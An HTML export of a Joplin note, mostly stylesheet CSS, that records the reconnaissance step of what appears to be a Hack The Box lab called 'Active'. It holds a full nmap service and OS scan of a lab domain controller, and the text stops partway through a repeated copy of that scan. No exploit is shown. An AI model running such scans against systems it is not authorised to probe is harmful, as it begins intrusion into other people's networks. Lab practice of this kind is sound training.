@@ -1,0 +1,1192 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Active</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Active</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="active">Active</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.61.180 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 16:17 -0500
+Nmap scan report for 10.129.61.180
+Host is up (0.011s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 21:17:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49162/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=1/29%OT=53%CT=1%CU=41028%PV=Y%DS=2%DC=T%G=Y%TM=697BCEC
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR
+OS:=10D%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS
+OS:=S%TS=7)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M552NW8S
+OS:T11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552
+OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
+OS:80%W=2000%O=M552NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
+OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
+OS:=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
+OS:)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-29T21:19:01
+|_  start_date: 2026-01-29T20:59:29
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT     ADDRESS
+1   9.61 ms 10.10.14.1
+2   9.82 ms 10.129.61.180
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.07 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.61.180 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 16:17 -0500
+Nmap scan report for 10.129.61.180
+Host is up (0.011s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 21:17:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
